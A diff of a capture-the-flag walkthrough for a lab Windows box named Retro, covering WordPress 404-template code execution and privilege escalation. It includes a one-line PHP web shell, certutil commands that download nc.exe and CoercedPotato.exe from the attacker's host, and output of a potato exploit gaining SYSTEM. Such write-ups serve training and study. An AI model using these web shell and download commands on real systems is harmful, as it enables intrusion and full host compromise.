@@ -1093,23 +1093,70 @@ It takes sometime:
 Again we are going to exploit the 404 template page in WP. This time the URL http:/10.10.106.56/404 did not work (I don't know why), so we to use the full path:
 
 	http:/10.10.106.56/retro/wp-content/themes/90s-retro/404.php
-Remember that Retro is a windows box, so you need to use a corresponding webshell. Since I had trouble to make it work, I used the old approach:
+Remember that Retro is a windows box, so you need to use a corresponding webshell. Since I had trouble to make it work, I coded a custom reverse shell that use netcat. You can get it [here](https://github.com/zinzloun/THM_WriteUP/blob/main/PT_Path_notes/Retro/rs_cert_nc.php).
 
-	<?php system($_GET['cmd']); ?>
- Then I proceed to:
- 1. download nc from my attacker machine
+I tried winpeas for privilege esclation but it hangs forever at:
 
-		?cmd=certutil.exe%20-urlcache%20-f%20http%3A%2F%2F10.9.2.142%3A8000%2Fnc.exe%20nc.exe
-		**** Online **** CertUtil: -URLCache command completed successfully. 
-2. Check the file exists:
+	����������͹ Found SSH AGENTS Files
+	File: C:\Users\All Users\Amazon\SSM\Logs\amazon-ssm-agent.log
+	[#---------]  16% \
 
-  		?cmd=dir
-   		...
-   		05/16/2024 05:42 AM 36,528 nc.exe
-3. Execute the reverse shell
+So I manually tried to find something interesting, eventually I found that SeImpersonatePrivilege is enabled.
 
-    		
-		
+	whoami
+	nt authority\iusr
+
+	
+	whoami /priv
+	
+	PRIVILEGES INFORMATION
+	----------------------
+	
+	Privilege Name          Description                               State  
+	======================= ========================================= =======
+	SeChangeNotifyPrivilege Bypass traverse checking                  Enabled
+	SeImpersonatePrivilege  Impersonate a client after authentication Enabled
+	SeCreateGlobalPrivilege Create global objects                     Enabled
+
+Then we can try to bake some poatatoes. Get the exploit:
+
+	certutil.exe -urlcache -f http://10.9.2.142:8000/CoercedPotato.exe cp.exe
+
+I execute the program but nothing happens :( and I didn't got any error. Then I remembered that RDP is enabled, let's try to check if I can get in using wade credentials. Since it was possible I tried to execute the program through the GUI and I got an error about VCRUntime non present. It happened because I compiled CoercedPotato in Visual Studio without setting Code Generation -> Runtime Library = Multi-threaded (/MT), that will embed all the needed library.
+Once recompiled the expolit I directly downloaded using Chrome. I thought to execute it directly in the RDP session but Wade does not have SeImpersonatePrivilege enabled (of course). So I switeched back to the reverse shell for iusr user, and fianlly we can execute the exploit:
+
+	cp.exe -c cmd.exe
+                                                                  
+	   ____                            _ ____       _        _        
+	  / ___|___   ___ _ __ ___ ___  __| |  _ \ ___ | |_ __ _| |_ ___  
+	 | |   / _ \ / _ \ '__/ __/ _ \/ _` | |_) / _ \| __/ _` | __/ _ \ 
+	 | |__| (_) |  __/ | | (_|  __/ (_| |  __/ (_) | || (_| | || (_) |
+	  \____\___/ \___|_|  \___\___|\__,_|_|   \___/ \__\__,_|\__\___/ 
+	                                                                  
+	                                           @Hack0ura @Prepouce    
+	                                                                  
+	[+] RUNNING ALL KNOWN EXPLOITS.
+	
+	[PIPESERVER] Creating a thread launching a server pipe listening on Named Pipe \\.\pipe\jOEXkASoyEitwABki\pipe\spoolss.
+	[PIPESERVER] Named pipe '\\.\pipe\jOEXkASoyEitwABki\pipe\spoolss' listening...
+	
+	[MS-RPRN] [*] Attempting MS-RPRN functions...
+	
+	[MS-RPRN] Starting RPC functions fuzzing...
+	 [MS-RPRN] [*] Invoking RpcRemoteFindFirstPrinterChangeNotificationEx with target path: \\127.0.0.1/pipe/jOEXkASoyEitwABki
+	
+	[PIPESERVER] A client connected!
+	
+	 ** Exploit completed **
+	
+	Microsoft Windows [Version 10.0.14393]
+	(c) 2016 Microsoft Corporation. All rights reserved.
+	
+	C:\Windows\system32>whoami
+	whoami
+	nt authority\system
+
+	
 
  
  
